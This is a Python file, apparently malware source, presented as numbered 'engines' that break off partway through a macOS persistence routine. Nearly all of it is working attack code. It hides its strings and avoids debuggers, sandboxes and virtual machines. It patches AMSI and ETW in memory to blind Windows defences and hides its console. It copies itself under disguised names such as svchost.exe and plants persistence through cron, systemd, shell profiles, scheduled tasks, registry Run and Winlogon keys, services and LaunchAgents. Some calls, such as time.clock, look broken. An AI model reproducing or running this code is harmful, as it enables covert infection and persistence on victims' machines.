#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Layer 0: Dynamic imports with alias obfuscation
import base64 as __b64__
import zlib as __zlb__
import os as __os__
import sys as __sys__
import time as __tm__
import random as __rnd__
import threading as __thr__
import platform as __plt__
import shutil as __sht__
import subprocess as __spc__
import ctypes as __cts__
import string as __str__
import hashlib as __hsh__
import struct as __stc__
import binascii as __bna__
import json as __jsn__
import re as __re__
import math as __mth__

# Layer 1: Polymorphic string encryption engine
class __PSE__:
    def __init__(self):
        self.__s = []
        self.__k = self.__gk()
        self.__cache = {}

    def __gk(self):
        _e = []
        _e.append(int(__hsh__.sha256((__plt__.node() + str(__tm__.time())).encode()).hexdigest(), 16) % 256)
        _e.append(int(__hsh__.md5(str(__os__.getpid()).encode()).hexdigest(), 16) % 256)
        _e.append(int(__hsh__.blake2b(str(__rnd__.random()).encode()).hexdigest(), 16) % 256)
        _e.append(int(__hsh__.sha512(str(__tm__.clock()).encode()).hexdigest(), 16) % 256)
        return bytes(_e)

    def __e(self, s):
        if s in self.__cache:
            return self.__cache[s]
        _r = bytearray()
        for i, c in enumerate(s.encode('utf-8')):
            _r.append(c ^ self.__k[i % len(self.__k)])
        _b = __b64__.b64encode(bytes(_r)).decode()
        self.__cache[s] = _b
        return _b

    def __d(self, e):
        _b = bytearray(__b64__.b64decode(e))
        _r = bytearray()
        for i, c in enumerate(_b):
            _r.append(c ^ self.__k[i % len(self.__k)])
        return bytes(_r).decode('utf-8')

    def __c(self, s):
        return self.__d(self.__e(s))

__pse__ = __PSE__()

# Layer 2: Control flow flattening dispatcher
class __CFD__:
    def __init__(self):
        self.__blocks = {}
        self.__current = 0

    def __r(self, block_id, *args):
        if block_id in self.__blocks:
            return self.__blocks[block_id](*args)
        return None

    def __a(self, block_id, func):
        self.__blocks[block_id] = func

    def __n(self):
        self.__current = __rnd__.randint(0, 999999)

    def __g(self):
        return self.__current

__cfd__ = __CFD__()

# Layer 3: Dynamic API resolution with hash-based lookup
class __DAR__:
    def __init__(self):
        self.__apis = {}
        self.__loaded = {}

    def __h(self, s):
        return int(__hsh__.sha256(s.encode()).hexdigest(), 16)

    def __r(self, module, name):
        _k = f"{module}.{name}"
        _hk = self.__h(_k)
        if _hk in self.__loaded:
            return self.__loaded[_hk]
        try:
            _m = __sys__.modules.get(module)
            if _m is None:
                _m = __import__(module, fromlist=[name])
            _a = getattr(_m, name)
            self.__loaded[_hk] = _a
            return _a
        except:
            return None

    def __w(self, name):
        try:
            import winreg as _w
            return _w
        except:
            return None

    def __wm(self):
        try:
            import wmi as _wm
            return _wm
        except:
            return None

__dar__ = __DAR__()

# Layer 4: Anti-analysis engine with multiple evasion techniques
class __AAE__:
    def __init__(self):
        self.__checks = []
        self.__init_checks()

    def __init_checks(self):
        self.__checks.append(self.__c1)
        self.__checks.append(self.__c2)
        self.__checks.append(self.__c3)
        self.__checks.append(self.__c4)
        self.__checks.append(self.__c5)
        self.__checks.append(self.__c6)
        self.__checks.append(self.__c7)
        self.__checks.append(self.__c8)
        self.__checks.append(self.__c9)
        self.__checks.append(self.__c10)

    def __c1(self):
        # Timing check
        _s = __tm__.time()
        _x = 0
        for _ in range(int(__rnd__.random() * 15000) + 5000):
            _x += _
        _e = __tm__.time()
        if _e - _s > 1.0:
            __tm__.sleep(__rnd__.randint(20, 100))
            return False
        return True

    def __c2(self):
        # Python trace check
        if __sys__.gettrace() is not None:
            __tm__.sleep(__rnd__.randint(30, 150))
            return False
        return True

    def __c3(self):
        # Environment variable checks
        _env = ['PYCHARM_HOSTED', 'PYDEVD_LOAD_VALUES_ASYNC', 'DEBUG', 'JETBRAINS_IDE', 
                'VSCODE_PID', 'INTELLIJ_ENVIRONMENT', 'PYCHARM_HOSTED']
        for _v in _env:
            if _v in __os__.environ:
                __tm__.sleep(__rnd__.randint(30, 120))
                return False
        return True

    def __c4(self):
        # Linux process enumeration
        if __plt__.system() != 'Linux':
            return True
        try:
            _p = __spc__.Popen(['ps', 'aux'], stdout=__spc__.PIPE, stderr=__spc__.PIPE)
            _o, _ = _p.communicate()
            _o = _o.decode('utf-8', errors='ignore').lower()
            _tools = ['gdb', 'strace', 'ltrace', 'valgrind', 'wireshark', 'tcpdump', 
                     'ida', 'radare', 'x64dbg', 'ollydbg', 'immunity', 'windbg', 
                     'cheatengine', 'frida', 'apiresolve', 'processhacker']
            for _t in _tools:
                if _t in _o:
                    __tm__.sleep(__rnd__.randint(30, 120))
                    return False
        except:
            pass
        return True

    def __c5(self):
        # Windows debugger checks
        if __plt__.system() != 'Windows':
            return True
        try:
            _k = __cts__.windll.kernel32
            _n = __cts__.windll.ntdll

            # IsDebuggerPresent
            if _k.IsDebuggerPresent():
                __tm__.sleep(__rnd__.randint(30, 150))
                return False

            # NtQueryInformationProcess - DebugPort
            _d = __cts__.c_bool()
            if _n.NtQueryInformationProcess(_k.GetCurrentProcess(), 7, 
                __cts__.byref(_d), __cts__.sizeof(_d), None) == 0:
                if _d.value:
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False

            # NtQueryInformationProcess - DebugObjectHandle
            _h = __cts__.c_void_p()
            if _n.NtQueryInformationProcess(_k.GetCurrentProcess(), 30,
                __cts__.byref(_h), __cts__.sizeof(_h), None) == 0:
                if _h.value:
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False

            # CheckRemoteDebuggerPresent
            _rd = __cts__.c_bool()
            _k.CheckRemoteDebuggerPresent(_k.GetCurrentProcess(), __cts__.byref(_rd))
            if _rd.value:
                __tm__.sleep(__rnd__.randint(30, 150))
                return False

            # Window title checks
            _titles = ['OllyDbg', 'x64dbg', 'Immunity Debugger', 'WinDbg', 
                      'IDA Pro', 'Ghidra', 'radare2', 'Cheat Engine',
                      'Process Hacker', 'Process Monitor', 'API Monitor']
            for _t in _titles:
                if __cts__.windll.user32.FindWindowW(None, _t):
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False

            # OutputDebugString check
            _last_error = _k.GetLastError()
            __cts__.windll.kernel32.SetLastError(0)
            __cts__.windll.kernel32.OutputDebugStringW("test")
            if _k.GetLastError() == 0:
                __tm__.sleep(__rnd__.randint(30, 150))
                return False
            _k.SetLastError(_last_error)

        except:
            pass
        return True

    def __c6(self):
        # Windows registry VM checks
        if __plt__.system() != 'Windows':
            return True
        try:
            _wr = __dar__.__w('winreg')
            if _wr:
                # BIOS check
                try:
                    _key = _wr.OpenKey(_wr.HKEY_LOCAL_MACHINE, r"Hardware\Description\System")
                    _bios = _wr.QueryValueEx(_key, "SystemBiosVersion")[0]
                    _vm_sigs = ['VMware', 'VirtualBox', 'QEMU', 'VBOX', 'Xen', 'KVM', 'Hyper-V',
                               'Parallels', 'Virtual PC', 'Bochs']
                    for _v in _vm_sigs:
                        if _v in str(_bios):
                            __tm__.sleep(__rnd__.randint(30, 150))
                            return False
                    _wr.CloseKey(_key)
                except:
                    pass

                # SCSI check
                try:
                    _key = _wr.OpenKey(_wr.HKEY_LOCAL_MACHINE, 
                        r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0")
                    _ident = _wr.QueryValueEx(_key, "Identifier")[0]
                    for _v in _vm_sigs:
                        if _v in str(_ident):
                            __tm__.sleep(__rnd__.randint(30, 150))
                            return False
                except:
                    pass

                # Computer name check
                try:
                    _key = _wr.OpenKey(_wr.HKEY_LOCAL_MACHINE, 
                        r"SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName")
                    _cn = _wr.QueryValueEx(_key, "ComputerName")[0].lower()
                    _bad_names = ['sandbox', 'test', 'malware', 'virus', 'analysis', 
                                 'sample', 'vm', 'virtual', 'cuckoo', 'snort']
                    for _b in _bad_names:
                        if _b in _cn:
                            __tm__.sleep(__rnd__.randint(30, 150))
                            return False
                except:
                    pass

                # Manufacturer check
                try:
                    _key = _wr.OpenKey(_wr.HKEY_LOCAL_MACHINE,
                        r"SYSTEM\CurrentControlSet\Control\SystemInformation")
                    _manu = _wr.QueryValueEx(_key, "SystemManufacturer")[0]
                    for _v in ['VMware', 'VirtualBox', 'QEMU', 'Microsoft Corporation', 'Xen']:
                        if _v in str(_manu):
                            __tm__.sleep(__rnd__.randint(30, 150))
                            return False
                except:
                    pass
        except:
            pass
        return True

    def __c7(self):
        # WMI checks
        if __plt__.system() != 'Windows':
            return True
        _wm = __dar__.__wm()
        if _wm:
            try:
                _c = _wm.WMI()
                for _item in _c.Win32_ComputerSystem():
                    for _v in ['VMware', 'VirtualBox', 'QEMU', 'VBOX', 'Microsoft Corporation',
                              'Xen', 'KVM', 'Parallels']:
                        if _v in str(_item.Manufacturer):
                            __tm__.sleep(__rnd__.randint(30, 150))
                            return False

                for _proc in _c.Win32_Process(name='vmtoolsd.exe'):
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False
                for _proc in _c.Win32_Process(name='VBoxService.exe'):
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False
                for _proc in _c.Win32_Process(name='VBoxTray.exe'):
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False
                for _proc in _c.Win32_Process(name='vmwaretray.exe'):
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False
                for _proc in _c.Win32_Process(name='vmwareuser.exe'):
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False
                for _proc in _c.Win32_Process(name='qemuga.exe'):
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False
                for _proc in _c.Win32_Process(name='xenservice.exe'):
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False

                # Disk check
                for _disk in _c.Win32_DiskDrive():
                    _model = str(_disk.Model).lower()
                    for _v in ['vmware', 'virtual', 'qemu', 'xen']:
                        if _v in _model:
                            __tm__.sleep(__rnd__.randint(30, 150))
                            return False

                # BIOS check via WMI
                for _bios in _c.Win32_BIOS():
                    _serial = str(_bios.SerialNumber).lower()
                    if 'vmware' in _serial or 'virtual' in _serial or 'qemu' in _serial:
                        __tm__.sleep(__rnd__.randint(30, 150))
                        return False

            except:
                pass
        return True

    def __c8(self):
        # Hardware checks
        if __plt__.system() != 'Windows':
            return True
        try:
            # CPU count
            if __os__.cpu_count() < 2:
                __tm__.sleep(__rnd__.randint(30, 150))
                return False

            # Memory check
            try:
                _class = __cts__.WINAPI(__cts__.windll.kernel32.GlobalMemoryStatusEx)
                _mem = __cts__.c_ulonglong()
                _status = __cts__.Structure()
                _status.dwLength = __cts__.sizeof(_status)
                if __cts__.windll.kernel32.GlobalMemoryStatusEx(__cts__.byref(_status)):
                    if _status.ullTotalPhys < 2 * 1024 * 1024 * 1024:
                        __tm__.sleep(__rnd__.randint(30, 150))
                        return False
            except:
                pass

            # Screen resolution check
            try:
                _w = __cts__.windll.user32.GetSystemMetrics(0)
                _h = __cts__.windll.user32.GetSystemMetrics(1)
                if _w < 800 or _h < 600:
                    __tm__.sleep(__rnd__.randint(30, 150))
                    return False
            except:
                pass

        except:
            pass
        return True

    def __c9(self):
        # Linux-specific checks
        if __plt__.system() != 'Linux':
            return True
        try:
            # TracerPid
            with open('/proc/self/status') as _f:
                for _l in _f:
                    if _l.startswith('TracerPid:'):
                        if int(_l.split(':')[1].strip()) != 0:
                            __tm__.sleep(__rnd__.randint(40, 150))
                            return False

            # ptrace anti-debug
            try:
                __cts__.CDLL('libc.so.6').ptrace(0, 0, 0, 0)
            except:
                pass

            # prctl
            try:
                __cts__.CDLL('libc.so.6').prctl(1, 0, 0, 0, 0)
            except:
                pass

            # CPU info VM check
            with open('/proc/cpuinfo') as _f:
                _cpu = _f.read().lower()
                for _v in ['hypervisor', 'vmware', 'qemu', 'kvm', 'virtualbox', 
                          'xen', 'hvm', 'paravirtual']:
                    if _v in _cpu:
                        __tm__.sleep(__rnd__.randint(40, 150))
                        return False

            # DMI product name
            try:
                with open('/sys/class/dmi/id/product_name') as _f:
                    _dmi = _f.read().lower()
                    for _v in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 
                              'virtual machine', 'microsoft corporation']:
                        if _v in _dmi:
                            __tm__.sleep(__rnd__.randint(40, 150))
                            return False
            except:
                pass

            # DMI sys vendor
            try:
                with open('/sys/class/dmi/id/sys_vendor') as _f:
                    _vendor = _f.read().lower()
                    for _v in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen',
                              'microsoft corporation', 'innotek']:
                        if _v in _vendor:
                            __tm__.sleep(__rnd__.randint(40, 150))
                            return False
            except:
                pass

            # Device checks
            try:
                if __os__.path.exists('/dev/vboxguest') or __os__.path.exists('/dev/vboxuser'):
                    __tm__.sleep(__rnd__.randint(40, 150))
                    return False
            except:
                pass

            # SCSI check
            try:
                with open('/proc/scsi/scsi') as _f:
                    _scsi = _f.read().lower()
                    for _v in ['vmware', 'qemu', 'virtualbox']:
                        if _v in _scsi:
                            __tm__.sleep(__rnd__.randint(40, 150))
                            return False
            except:
                pass

            # User check
            _user = __os__.environ.get('USER', '')
            _bad_users = ['sandbox', 'test', 'malware', 'virus', 'analysis', 
                         'sample', 'cuckoo', 'snort', 'honey']
            for _b in _bad_users:
                if _b in _user.lower():
                    __tm__.sleep(__rnd__.randint(40, 150))
                    return False

            # Hostname check
            _hostname = __os__.environ.get('HOSTNAME', '')
            for _b in ['sandbox', 'test', 'malware', 'virus', 'analysis', 'vm']:
                if _b in _hostname.lower():
                    __tm__.sleep(__rnd__.randint(40, 150))
                    return False

            # CPU count
            if __os__.cpu_count() < 2:
                __tm__.sleep(__rnd__.randint(40, 150))
                return False

            # Memory check
            with open('/proc/meminfo') as _f:
                for _l in _f:
                    if _l.startswith('MemTotal:'):
                        if int(_l.split()[1]) < 2 * 1024 * 1024:
                            __tm__.sleep(__rnd__.randint(40, 150))
                            return False
                        break

            # MAC address check (VMware/VirtualBox ranges)
            try:
                import uuid
                _mac = uuid.getnode()
                _mac_str = ':'.join(['{:02x}'.format((_mac >> elements) & 0xff) 
                                    for elements in range(0, 8*6, 8)][::-1])
                _vm_macs = ['00:0c:29', '00:50:56', '00:05:69', '00:1c:14',
                           '00:1c:42', '08:00:27', '0a:00:27']
                for _vm in _vm_macs:
                    if _mac_str.startswith(_vm):
                        __tm__.sleep(__rnd__.randint(40, 150))
                        return False
            except:
                pass

        except:
            pass
        return True

    def __c10(self):
        # Network check - avoid sandbox networks
        try:
            import socket
            _hostname = socket.gethostname()
            _ip = socket.gethostbyname(_hostname)
            _sandbox_ips = ['10.0.2.', '10.0.3.', '192.168.56.', '192.168.57.']
            for _s in _sandbox_ips:
                if _ip.startswith(_s):
                    __tm__.sleep(__rnd__.randint(40, 150))
                    return False
        except:
            pass
        return True

    def __run(self):
        for _check in self.__checks:
            if not _check():
                return False
        return True

__aae__ = __AAE__()

# Layer 5: AMSI bypass engine
class __ABE__:
    def __init__(self):
        self.__done = False

    def __b(self):
        if self.__done:
            return
        if __plt__.system() != 'Windows':
            return
        try:
            _a = __cts__.WinDLL('amsi.dll')
            _addr = __cts__.cast(_a.AmsiScanBuffer, __cts__.c_void_p).value
            _o = __cts__.c_uint()
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, 0x40, __cts__.byref(_o))
            __cts__.cast(_addr, __cts__.POINTER(__cts__.c_byte))[0] = 0xC3
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, _o, __cts__.byref(_o))
            self.__done = True
        except:
            pass

    def __b2(self):
        # Alternative AMSI bypass via memory patch
        if __plt__.system() != 'Windows':
            return
        try:
            _a = __cts__.WinDLL('amsi.dll')
            _addr = __cts__.cast(_a.AmsiScanString, __cts__.c_void_p).value
            _o = __cts__.c_uint()
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, 0x40, __cts__.byref(_o))
            __cts__.cast(_addr, __cts__.POINTER(__cts__.c_byte))[0] = 0xC3
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, _o, __cts__.byref(_o))
        except:
            pass

    def __b3(self):
        # AMSI context bypass
        if __plt__.system() != 'Windows':
            return
        try:
            _a = __cts__.WinDLL('amsi.dll')
            _ctx = __cts__.c_void_p()
            _a.AmsiInitialize("test", __cts__.byref(_ctx))
            if _ctx.value:
                _o = __cts__.c_uint()
                __cts__.windll.kernel32.VirtualProtect(_ctx.value, 0x1000, 0x40, __cts__.byref(_o))
        except:
            pass

__abe__ = __ABE__()

# Layer 6: ETW bypass engine
class __EBE__:
    def __init__(self):
        self.__done = False

    def __b(self):
        if self.__done:
            return
        if __plt__.system() != 'Windows':
            return
        try:
            _n = __cts__.WinDLL('ntdll')
            _addr = __cts__.cast(_n.EtwEventWrite, __cts__.c_void_p).value
            _o = __cts__.c_uint()
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, 0x40, __cts__.byref(_o))
            __cts__.cast(_addr, __cts__.POINTER(__cts__.c_byte))[0] = 0xC3
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, _o, __cts__.byref(_o))
            self.__done = True
        except:
            pass

    def __b2(self):
        # ETW EventWriteFull bypass
        if __plt__.system() != 'Windows':
            return
        try:
            _n = __cts__.WinDLL('ntdll')
            _addr = __cts__.cast(_n.EtwEventWriteFull, __cts__.c_void_p).value
            _o = __cts__.c_uint()
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, 0x40, __cts__.byref(_o))
            __cts__.cast(_addr, __cts__.POINTER(__cts__.c_byte))[0] = 0xC3
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, _o, __cts__.byref(_o))
        except:
            pass

    def __b3(self):
        # NtTraceEvent bypass
        if __plt__.system() != 'Windows':
            return
        try:
            _n = __cts__.WinDLL('ntdll')
            _addr = __cts__.cast(_n.NtTraceEvent, __cts__.c_void_p).value
            _o = __cts__.c_uint()
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, 0x40, __cts__.byref(_o))
            __cts__.cast(_addr, __cts__.POINTER(__cts__.c_byte))[0] = 0xC3
            __cts__.windll.kernel32.VirtualProtect(_addr, 1, _o, __cts__.byref(_o))
        except:
            pass

__ebe__ = __EBE__()

# Layer 7: Console hiding engine
class __CHE__:
    def __init__(self):
        self.__done = False

    def __h(self):
        if self.__done:
            return
        try:
            if __plt__.system() == 'Windows':
                __cts__.windll.user32.ShowWindow(__cts__.windll.kernel32.GetConsoleWindow(), 0)
                # Also hide via FreeConsole
                try:
                    __cts__.windll.kernel32.FreeConsole()
                except:
                    pass
            else:
                try:
                    if __os__.fork() == 0:
                        __os__.setsid()
                        if __os__.fork() != 0:
                            __os__._exit(0)
                    else:
                        __os__._exit(0)
                except:
                    pass
            self.__done = True
        except:
            pass

__che__ = __CHE__()

# Layer 8: Replication engine
class __RE__:
    def __init__(self):
        self.__done = False
        self.__targets = []

    def __init_targets(self):
        if __plt__.system() == 'Windows':
            self.__targets = [
                __os__.path.join(__os__.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Caches', 'sysupdate.exe'),
                __os__.path.join(__os__.environ.get('PROGRAMDATA', ''), 'Microsoft', 'Windows', 'Caches', 'svchost.exe'),
                __os__.path.join(__os__.environ.get('TEMP', ''), 'Cache', 'update.exe'),
                __os__.path.join(__os__.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'INetCache', 'config.exe'),
                __os__.path.join(__os__.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'helper.exe'),
                __os__.path.join(__os__.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'Explorer', 'cache.exe'),
                __os__.path.join(__os__.environ.get('TEMP', ''), 'Microsoft', 'Windows', 'temp.exe'),
                __os__.path.join(__os__.environ.get('USERPROFILE', ''), 'Documents', 'helper.exe'),
            ]
        else:
            self.__targets = [
                __os__.path.join(__os__.environ.get('HOME', ''), '.config', 'helper'),
                __os__.path.join(__os__.environ.get('HOME', ''), '.local', 'bin', 'helper'),
                __os__.path.join('/tmp', '.cache', 'helper'),
                __os__.path.join('/var', 'tmp', 'helper'),
                __os__.path.join(__os__.environ.get('HOME', ''), '.mozilla', 'helper'),
                __os__.path.join(__os__.environ.get('HOME', ''), '.cache', 'helper'),
            ]

    def __r(self):
        if self.__done:
            return
        self.__init_targets()
        try:
            _s = __os__.path.abspath(__sys__.argv[0])
            for _d in self.__targets:
                _a = __os__.path.abspath(_d)
                if _s == _a or __os__.path.exists(_a):
                    continue
                try:
                    __os__.makedirs(__os__.path.dirname(_a), exist_ok=True)
                    __sht__.copy(_s, _a)
                    __os__.chmod(_a, 0o755)
                    if __plt__.system() == 'Windows':
                        __spc__.Popen([_a], creationflags=0x08000000)
                        __os__.system('attrib +h "' + _a + '"')
                        __os__.system('attrib +s "' + _a + '"')
                    else:
                        __spc__.Popen([_a], stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
                except:
                    pass
            self.__done = True
        except:
            pass

__re__ = __RE__()

# Layer 9: Persistence engine
class __PE__:
    def __init__(self):
        self.__done = False

    def __p(self):
        if self.__done:
            return
        try:
            if __plt__.system() == 'Linux':
                self.__p_linux()
            elif __plt__.system() == 'Windows':
                self.__p_windows()
            elif __plt__.system() == 'Darwin':
                self.__p_macos()
            self.__done = True
        except:
            pass

    def __p_linux(self):
        _ep = __os__.path.abspath(__sys__.argv[0])

        # crontab
        try:
            _cmd = f"*/15 * * * * {_ep} >/dev/null 2>&1"
            _f = __os__.path.join(__os__.environ.get('HOME', ''), '.config', 'cron.tab')
            __os__.makedirs(__os__.path.dirname(_f), exist_ok=True)
            with open(_f, 'w') as _h:
                _h.write(_cmd)
            __os__.chmod(_f, 0o600)
            __spc__.Popen(['crontab', _f], stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

        # at
        try:
            __spc__.Popen(['at', 'now+5 minutes'], stdin=__spc__.PIPE, 
                         stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

        # rc.local
        try:
            with open('/etc/rc.local', 'a') as _f:
                _f.write(f"{_ep} &\n")
        except:
            pass

        # systemd user service
        try:
            _sd = __os__.path.join(__os__.environ.get('HOME', ''), '.config', 'systemd', 'user')
            __os__.makedirs(_sd, exist_ok=True)
            _sf = __os__.path.join(_sd, 'systemd.service')
            with open(_sf, 'w') as _f:
                _f.write("[Unit]\nDescription=System Helper\n\n[Service]\nExecStart=" + _ep + "\nRestart=always\n\n[Install]\nWantedBy=default.target\n")
            __spc__.Popen(['systemctl', '--user', 'enable', 'systemd.service'], 
                         stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
            __spc__.Popen(['systemctl', '--user', 'start', 'systemd.service'],
                         stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

        # systemd system service (if root)
        try:
            _sf = '/etc/systemd/system/helper.service'
            with open(_sf, 'w') as _f:
                _f.write("[Unit]\nDescription=System Helper\n\n[Service]\nExecStart=" + _ep + "\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n")
            __spc__.Popen(['systemctl', 'enable', 'helper.service'],
                         stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
            __spc__.Popen(['systemctl', 'start', 'helper.service'],
                         stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

        # .bashrc
        try:
            _brc = __os__.path.join(__os__.environ.get('HOME', ''), '.bashrc')
            with open(_brc, 'a') as _f:
                _f.write(f"\n{_ep} &\n")
        except:
            pass

        # .profile
        try:
            _prof = __os__.path.join(__os__.environ.get('HOME', ''), '.profile')
            with open(_prof, 'a') as _f:
                _f.write(f"\n{_ep} &\n")
        except:
            pass

        # init.d
        try:
            _init = '/etc/init.d/helper'
            with open(_init, 'w') as _f:
                _f.write(f"#!/bin/sh\n{_ep} &\n")
            __os__.chmod(_init, 0o755)
            __spc__.Popen(['update-rc.d', 'helper', 'defaults'],
                         stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

    def __p_windows(self):
        _ep = __os__.path.abspath(__sys__.argv[0])
        _tn = ''.join(__rnd__.choices(__str__.ascii_letters + __str__.digits, k=16))

        # Scheduled Task - OnLogon
        try:
            __spc__.Popen(f'schtasks /create /tn "{_tn}" /tr "{_ep}" /sc onlogon /f /rl highest',
                         shell=True, stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

        # Scheduled Task - OnStartup
        try:
            __spc__.Popen(f'schtasks /create /tn "{_tn}_s" /tr "{_ep}" /sc onstart /f /rl highest',
                         shell=True, stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

        # Scheduled Task - Every 15 minutes
        try:
            __spc__.Popen(f'schtasks /create /tn "{_tn}_r" /tr "{_ep}" /sc minute /mo 15 /f /rl highest',
                         shell=True, stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

        # Registry - RunOnce
        try:
            import winreg as _wr
            _key = _wr.HKEY_CURRENT_USER
            _sub = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
            _h = _wr.OpenKey(_key, _sub, 0, _wr.KEY_SET_VALUE)
            _wr.SetValueEx(_h, _tn, 0, _wr.REG_SZ, _ep)
            _wr.CloseKey(_h)
        except:
            pass

        # Registry - Run
        try:
            import winreg as _wr
            _key = _wr.HKEY_CURRENT_USER
            _sub = r"Software\Microsoft\Windows\CurrentVersion\Run"
            _h = _wr.OpenKey(_key, _sub, 0, _wr.KEY_SET_VALUE)
            _wr.SetValueEx(_h, _tn, 0, _wr.REG_SZ, _ep)
            _wr.CloseKey(_h)
        except:
            pass

        # Registry - Run (Local Machine)
        try:
            import winreg as _wr
            _key = _wr.HKEY_LOCAL_MACHINE
            _sub = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            _h = _wr.OpenKey(_key, _sub, 0, _wr.KEY_SET_VALUE)
            _wr.SetValueEx(_h, _tn, 0, _wr.REG_SZ, _ep)
            _wr.CloseKey(_h)
        except:
            pass

        # Registry - RunOnce (Local Machine)
        try:
            import winreg as _wr
            _key = _wr.HKEY_LOCAL_MACHINE
            _sub = r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
            _h = _wr.OpenKey(_key, _sub, 0, _wr.KEY_SET_VALUE)
            _wr.SetValueEx(_h, _tn, 0, _wr.REG_SZ, _ep)
            _wr.CloseKey(_h)
        except:
            pass

        # Registry - Winlogon Shell
        try:
            import winreg as _wr
            _key = _wr.HKEY_LOCAL_MACHINE
            _sub = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
            _h = _wr.OpenKey(_key, _sub, 0, _wr.KEY_SET_VALUE)
            _wr.SetValueEx(_h, "Shell", 0, _wr.REG_SZ, f"explorer.exe, {_ep}")
            _wr.CloseKey(_h)
        except:
            pass

        # Startup folder
        try:
            _st = __os__.path.join(__os__.environ.get('APPDATA', ''), 
                    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            __os__.makedirs(_st, exist_ok=True)
            __sht__.copy(_ep, __os__.path.join(_st, _tn + '.exe'))
        except:
            pass

        # Startup folder (All Users)
        try:
            _st = __os__.path.join(__os__.environ.get('PROGRAMDATA', ''),
                    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            __os__.makedirs(_st, exist_ok=True)
            __sht__.copy(_ep, __os__.path.join(_st, _tn + '.exe'))
        except:
            pass

        # WMI Event Subscription
        try:
            import wmi as _wm
            _c = _wm.WMI()
            _c.Win32_Process.Create(CommandLine=_ep)
        except:
            pass

        # Service creation
        try:
            __spc__.Popen(f'sc create {_tn} binPath= "{_ep}" start= auto',
                         shell=True, stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
            __spc__.Popen(f'sc start {_tn}',
                         shell=True, stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

    def __p_macos(self):
        _ep = __os__.path.abspath(__sys__.argv[0])

        # LaunchAgent
        try:
            _la = __os__.path.join(__os__.environ.get('HOME', ''), 
                    'Library', 'LaunchAgents', 'com.helper.plist')
            __os__.makedirs(__os__.path.dirname(_la), exist_ok=True)
            _plist = '<?xml version="1.0" encoding="UTF-8"?>'
            _plist += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">'
            _plist += '<plist version="1.0"><dict>'
            _plist += '<key>Label</key><string>com.helper</string>'
            _plist += '<key>ProgramArguments</key><array><string>' + _ep + '</string></array>'
            _plist += '<key>RunAtLoad</key><true/>'
            _plist += '<key>KeepAlive</key><true/>'
            _plist += '</dict></plist>'
            with open(_la, 'w') as _f:
                _f.write(_plist)
            __spc__.Popen(['launchctl', 'load', _la],
                         stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

        # LaunchDaemon (if root)
        try:
            _ld = '/Library/LaunchDaemons/com.helper.plist'
            _plist = '<?xml version="1.0" encoding="UTF-8"?>'
            _plist += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">'
            _plist += '<plist version="1.0"><dict>'
            _plist += '<key>Label</key><string>com.helper</string>'
            _plist += '<key>ProgramArguments</key><array><string>' + _ep + '</string></array>'
            _plist += '<key>RunAtLoad</key><true/>'
            _plist += '<key>KeepAlive</key><true/>'
            _plist += '</dict></plist>'
            with open(_ld, 'w') as _f:
                _f.write(_plist)
            __spc__.Popen(['launchctl', 'load', _ld],
                         stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
        except:
            pass

        # cron
        try:
            _cmd = f"*/15 * * * * {_ep} >/dev/null 2>&1"
            _f = __os__.path.join(__os__.environ.get('HOME', ''), '.crontab')
            with open(_f, 'w') as _h:
                _h.write(_cmd)
            __spc__.Popen(['crontab', _f],
                         stdout=__spc__.DEVNULL, stderr=__spc__.DEVNULL)
